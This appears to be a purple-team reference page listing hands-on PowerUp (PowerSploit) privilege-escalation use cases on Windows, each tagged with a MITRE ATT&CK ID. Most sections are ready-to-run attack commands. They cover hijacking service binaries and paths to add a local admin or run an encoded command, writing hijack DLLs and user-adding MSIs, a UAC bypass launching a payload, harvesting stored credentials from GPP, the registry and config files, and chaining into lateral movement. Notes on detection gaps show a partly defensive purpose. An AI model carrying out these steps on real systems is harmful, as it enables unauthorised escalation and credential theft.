# PowerUp — Hands-On Use Cases

Function names below follow the **archived PowerShellMafia/PowerSploit `master` branch** (the more complete, alias-preserving reference per `01 - Overview.md`); the older name BC-SECURITY's Empire-bundled copy uses is noted inline the first time a function has one.

## Contents
- [Full-Surface Triage with Invoke-PrivescAudit](#full-surface-triage-with-invoke-privescaudit)
- [Unquoted Service Path Abuse](#unquoted-service-path-abuse)
- [Weak Service-File/Service-ACL Abuse (binPath Hijack)](#weak-service-fileservice-acl-abuse-binpath-hijack)
- [Service DACL Reconnaissance](#service-dacl-reconnaissance)
- [DLL Hijacking via a Writable PATH Directory](#dll-hijacking-via-a-writable-path-directory)
- [AlwaysInstallElevated Abuse](#alwaysinstallelevated-abuse)
- [Scheduled-Task Action-File Hijacking](#scheduled-task-action-file-hijacking)
- [Harvesting Cached GPP Passwords](#harvesting-cached-gpp-passwords)
- [Harvesting Registry Autologon Credentials](#harvesting-registry-autologon-credentials)
- [Harvesting IIS/Web-Config and McAfee SiteList Credentials](#harvesting-iisweb-config-and-mcafee-sitelist-credentials)
- [Enumerating and Enabling Token Privileges](#enumerating-and-enabling-token-privileges)
- [UAC Bypass via Invoke-EventVwrBypass](#uac-bypass-via-invoke-eventvwrbypass)
- [Chained Workflow: PowerUp Finding → Downstream Tool](#chained-workflow-powerup-finding--downstream-tool)

---

## Full-Surface Triage with Invoke-PrivescAudit

**MITRE ATT&CK:** No single ID — this runs every check below, each individually tagged.

```powershell
Invoke-PrivescAudit
Invoke-PrivescAudit -Format List
Invoke-PrivescAudit -Format HTML

# Legacy alias — still works, verified via the source's own Set-Alias mapping
Invoke-AllChecks
```

The standard first move after landing on a Windows host — one pass across every unquoted-service, modifiable-service, DLL-hijack, AlwaysInstallElevated, autologon, autorun, scheduled-task, unattended-install, IIS-config, McAfee-SiteList, and cached-GPP-password check PowerUp knows.

## Unquoted Service Path Abuse

**MITRE ATT&CK:** T1574.009 (Hijack Execution Flow: Path Interception by Unquoted Path)

```powershell
Get-UnquotedService
# BC-SECURITY-bundled Empire copy: Get-ServiceUnquoted

# For a service with binPath "C:\Program Files\My App\service.exe", drop a
# binary at C:\Program.exe (if that directory is writable) and restart the service
```

Same technique class `LOLBins/sc/01 - Overview.md`'s red-flag callout discusses from the manual/`sc.exe` side — `Get-UnquotedService` automates the discovery half only; the actual planted-binary drop and service restart are separate, ordinary filesystem-write + service-control operations.

## Weak Service-File/Service-ACL Abuse (binPath Hijack)

**MITRE ATT&CK:** T1543.003 (Create or Modify System Process: Windows Service)

```powershell
# Discovery
Get-ModifiableService
Get-ModifiableServiceFile

# Abuse — reconfigure an existing service's binPath directly via ChangeServiceConfig
# (reflective P/Invoke — no sc.exe child process, see 01 - Overview.md)
Set-ServiceBinaryPath -Name 'VulnSvc' -Path 'C:\Windows\Temp\svc.exe'
# BC-SECURITY-bundled Empire copy: Set-ServiceBinPath

# Or replace the binary in place and add a local admin by default
Install-ServiceBinary -Name 'VulnSvc'

# Custom command instead of the default user-add behavior
Install-ServiceBinary -Name 'VulnSvc' -Command 'powershell -enc <base64>'

# Restore the original binary afterward (cleanup)
Restore-ServiceBinary -Name 'VulnSvc'
```

`Install-ServiceBinary`/`Write-ServiceBinary` both draw from the same hardcoded, pre-compiled `$B64Binary` PE template documented in `01 - Overview.md` — every dropped binary from these two functions is byte-identical except for the patched command/credential string. Same evidentiary gap as `LOLBins/sc/`'s `sc config` finding applies directly: reconfiguring an **already-installed** service via `ChangeServiceConfig` fires neither Event 4697 nor 7045 (both install-only) — see `04 - Target Evidence.md`.

## Service DACL Reconnaissance

**MITRE ATT&CK:** T1069.001 (Permission Groups Discovery: Local Groups, service-rights variant)

```powershell
Add-ServiceDacl -ServiceName 'VulnSvc' | Test-ServiceDaclPermission -PermissionsType ChangeConfig
```

Checks the service object's own security descriptor (SDDL, distinct from filesystem/registry ACLs) for reconfiguration rights the current principal holds — the PowerShell-native equivalent of `sc sdshow`/`sc sdset` reconnaissance documented in `LOLBins/sc/01 - Overview.md`.

## DLL Hijacking via a Writable PATH Directory

**MITRE ATT&CK:** T1574.001 (Hijack Execution Flow: DLL), T1574.007 (Path Interception by PATH Environment Variable), T1574.008 (Path Interception by Search Order Hijacking)

```powershell
Find-PathDLLHijack
Find-ProcessDLLHijack

Write-HijackDll -DllPath 'C:\WritableDir\wlbsctrl.dll'
```

`Find-PathDLLHijack` checks every directory on `%PATH%` for write access by the current principal — a hit means any process that resolves a missing DLL through the standard search order picks up an attacker-planted copy first.

## AlwaysInstallElevated Abuse

**MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)

```powershell
Get-RegistryAlwaysInstallElevated

# If both HKLM and HKCU AlwaysInstallElevated are set to 1:
Write-UserAddMSI
# msiexec /quiet /qn /i UserAdd.msi   ← install path, runs elevated regardless of the invoking user's UAC state
```

Both `HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and the `HKCU` equivalent must be `1` — verified directly in source (`Get-RegistryAlwaysInstallElevated` checks both explicitly and only returns true if both are set). `Write-UserAddMSI` writes a second pre-compiled artifact (an MSI, not a PE) using the same patch-a-template approach as `Write-ServiceBinary`.

## Scheduled-Task Action-File Hijacking

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job: Scheduled Task)

```powershell
Get-ModifiableScheduledTaskFile
```

Finds scheduled tasks whose action target (the executable/script the task actually runs) sits in a location the current principal can overwrite — see `Purple Teaming/LOLBins/schtasks/` for the broader Scheduled Task artifact/event-ID reference (`Windows/10 - Persistence Mechanisms/Scheduled Tasks.md`) this discovery function feeds into.

## Harvesting Cached GPP Passwords

**MITRE ATT&CK:** T1552.006 (Unsecured Credentials: Group Policy Preferences)

```powershell
Get-CachedGPPPassword
```

Reverses the long-published static AES key Microsoft used to "encrypt" Group Policy Preferences passwords before MS14-025 (2014) stopped new GPP-password creation — old cached XML files under SYSVOL frequently survive years past the patch.

## Harvesting Registry Autologon Credentials

**MITRE ATT&CK:** T1552.002 (Unsecured Credentials: Credentials in Registry)

```powershell
Get-RegistryAutoLogon
Get-ModifiableRegistryAutoRun
```

`Get-RegistryAutoLogon` reads `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`'s `DefaultUserName`/`DefaultPassword` values directly, where configured. `Get-ModifiableRegistryAutoRun` is a separate check — writable-target autorun keys, not credential exposure.

## Harvesting IIS/Web-Config and McAfee SiteList Credentials

**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials In Files)

```powershell
Get-ApplicationHost
Get-WebConfig
Get-SiteListPassword
Get-UnattendedInstallFile
```

Each targets a distinct, well-known plaintext-or-reversibly-encrypted credential source: IIS's central `applicationHost.config` (app-pool identities), per-site ASP.NET `web.config` connection strings, McAfee ePO's `SiteList.xml`, and unattended-install answer files (`unattend.xml`/`sysprep.inf`/`autounattend.xml`).

## Enumerating and Enabling Token Privileges

**MITRE ATT&CK:** T1134 (Access Token Manipulation) — enumeration/prep only; PowerUp does not itself perform token duplication/impersonation

```powershell
Get-ProcessTokenPrivilege -Special
# BC-SECURITY-bundled Empire copy: no direct equivalent — check
# Get-CurrentUserTokenGroupSid/Get-TokenInformation instead

Enable-Privilege -Privilege SeBackupPrivilege
```

`Enable-Privilege` can only turn on a privilege already **assigned** to the token but currently disabled — it cannot grant a privilege the token was never issued (see `01 - Overview.md`'s Prerequisites table).

## UAC Bypass via Invoke-EventVwrBypass

**MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)

```powershell
Invoke-EventVwrBypass -Command 'C:\Windows\Temp\payload.exe'
```

**Archived-original only** — absent from BC-SECURITY's older bundled Empire copy (see `01 - Overview.md`'s divergence table). Credited in source to `@enigma0x3`; abuses `eventvwr.exe`'s auto-elevating registry-key lookup to launch an attacker-specified command at a higher integrity level without a UAC prompt.

## Chained Workflow: PowerUp Finding → Downstream Tool

```
Invoke-PrivescAudit                          → full-surface finding list
  → Get-ModifiableService / Get-UnquotedService → candidate service target
  → Install-ServiceBinary / Set-ServiceBinaryPath → local admin via SYSTEM-context service
Get-CachedGPPPassword / Get-RegistryAutoLogon → recovered plaintext credential
  → chain into LaZagne/ or directly into lateral movement (PsExec/, Impacket/psexec/)
```

Where PowerUp's own SYSTEM-level service abuse is the end goal rather than a stepping stone, the resulting shell is already the escalation — no further chaining needed, which is why PowerUp is typically the *last* tool in a local-privesc chain rather than a pivot point like PowerView or BloodHound.
